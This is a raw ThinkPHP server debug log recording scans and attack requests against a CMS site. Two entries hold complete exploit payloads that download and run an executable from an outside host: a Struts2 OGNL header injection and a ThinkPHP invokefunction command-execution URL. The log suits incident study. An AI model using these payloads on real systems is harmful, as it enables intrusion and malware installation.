[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000050s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000699s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000732s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index.do',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'content-type' => '%{(#nike=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'cmd.exe /c certutil.exe -urlcache -split -f http://fid.hognoob.se/download.exe %SystemRoot%/Temp/fahwwpsbyfvkjmv26247.exe & cmd.exe /c %SystemRoot%/Temp/fahwwpsbyfvkjmv26247.exe\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://114.115.146.220:80/index.do',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000209s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T14:37:04+08:00 ] 45.228.109.10 GET 114.115.146.220:80/
[运行时间：0.024781s] [吞吐率：40.35req/s] [内存消耗：472.14kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001070s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001103s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000869s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000329s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000223s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T15:52:24+08:00 ] 116.203.95.116 GET 114.115.146.220/wp-login.php
[运行时间：0.024127s] [吞吐率：41.45req/s] [内存消耗：333.06kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001256s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001290s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wp-login.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000266s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T15:56:30+08:00 ] 37.221.248.241 GET 114.115.146.220:80/
[运行时间：0.027882s] [吞吐率：35.87req/s] [内存消耗：472.14kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000059s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001091s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001152s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000959s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000388s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000222s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T17:14:10+08:00 ] 139.162.88.63 GET clientapi.ipip.nethttp://clientapi.ipip.net/echo.php?info=1234567890
[运行时间：0.019786s] [吞吐率：50.54req/s] [内存消耗：332.99kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001082s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001117s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'echo.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'clientapi.ipip.net',
  'user-agent' => 'Go-http-client/1.1',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
  'info' => '1234567890',
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000213s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T17:21:01+08:00 ] 210.52.224.209 GET /
[运行时间：0.032451s] [吞吐率：30.82req/s] [内存消耗：470.84kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000072s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001269s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001312s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001416s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000557s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000379s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T17:22:00+08:00 ] 210.52.224.209 GET 114.115.146.220/nmaplowercheck1575537721
[运行时间：0.017127s] [吞吐率：58.39req/s] [内存消耗：332.99kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000785s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000819s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'nmaplowercheck1575537721',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000213s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T17:22:00+08:00 ] 210.52.224.209 GET /
[运行时间：0.028255s] [吞吐率：35.39req/s] [内存消耗：470.84kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001070s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001104s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000902s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000331s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000224s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T17:22:00+08:00 ] 210.52.224.209 POST 114.115.146.220/sdk
[运行时间：0.018295s] [吞吐率：54.66req/s] [内存消耗：333.95kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000054s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000920s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000952s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sdk',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'content-length' => '441',
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000253s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T17:22:00+08:00 ] 210.52.224.209 GET /
[运行时间：0.043018s] [吞吐率：23.25req/s] [内存消耗：470.84kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000053s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000943s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000977s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000787s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000306s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000220s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T17:22:00+08:00 ] 210.52.224.209 GET 114.115.146.220/
[运行时间：0.014373s] [吞吐率：69.57req/s] [内存消耗：471.29kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000700s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000733s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000560s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000262s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000222s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T17:22:00+08:00 ] 210.52.224.209 GET 114.115.146.220/HNAP1
[运行时间：0.013247s] [吞吐率：75.49req/s] [内存消耗：332.93kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000054s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001009s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001043s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'HNAP1',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000226s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T17:22:00+08:00 ] 210.52.224.209 GET 114.115.146.220/evox/about
[运行时间：0.013653s] [吞吐率：73.24req/s] [内存消耗：332.99kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001066s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001101s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'evox',
    1 => 'about',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000224s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T17:22:45+08:00 ] 210.52.224.209 GET 114.115.146.220/
[运行时间：0.024543s] [吞吐率：40.75req/s] [内存消耗：472.35kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000968s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001002s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html,*/*',
  'content-type' => 'application/x-www-form-urlencoded;charset=UTF-8',
  'user-agent' => 'Mozilla/5.0 (compatible; Wappalyzer)',
  'host' => '114.115.146.220',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000698s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000361s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000304s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T17:22:46+08:00 ] 210.52.224.209 GET 114.115.146.220/
[运行时间：0.013872s] [吞吐率：72.09req/s] [内存消耗：472.88kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000661s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000694s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Chrome/54.0 (Windows NT 10.0)',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'accept-charset' => 'GBK,utf-8;q=0.7,*;q=0.3',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000562s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000259s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T17:54:07+08:00 ] 185.153.196.97 GET 114.115.146.220:80/?XDEBUG_SESSION_START=phpstorm
[运行时间：0.024350s] [吞吐率：41.07req/s] [内存消耗：472.88kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001017s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001051s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
  'connection' => 'close',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
  'XDEBUG_SESSION_START' => 'phpstorm',
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000889s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000317s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000229s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T17:59:08+08:00 ] 139.159.239.31 HEAD 114.115.146.220/phpinfo.php
[运行时间：0.023145s] [吞吐率：43.21req/s] [内存消耗：332.46kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000055s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001288s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001339s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'phpinfo.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000229s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T17:59:08+08:00 ] 139.159.239.31 HEAD 114.115.146.220/l.php
[运行时间：0.028765s] [吞吐率：34.76req/s] [内存消耗：332.46kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000060s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000907s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000942s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'l.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000226s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T17:59:08+08:00 ] 139.159.239.31 HEAD 114.115.146.220/index.php
[运行时间：0.036785s] [吞吐率：27.18req/s] [内存消耗：471.48kb] [文件加载：129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000052s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001065s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001108s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000962s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000330s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000314s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T17:59:08+08:00 ] 139.159.239.31 HEAD 114.115.146.220/%20index.php
[运行时间：0.012686s] [吞吐率：78.83req/s] [内存消耗：331.07kb] [文件加载：117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000941s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000976s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => ' index.php',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000217s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-05T18:40:59+08:00 ] 114.115.184.18 GET 114.115.146.220/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/bmlhggsflrnrend14224.exe');start%20%SystemRoot%/Temp/bmlhggsflrnrend14224.exe
[运行时间：0.021105s] [吞吐率：47.38req/s] [内存消耗：345.38kb] [文件加载：118]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000059s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001091s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001125s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://114.115.146.220:80/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'%SystemRoot%/Temp/bmlhggsflrnrend14224.exe\');start %SystemRoot%/Temp/bmlhggsflrnrend14224.exe',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'system',
    1 => 
    array (
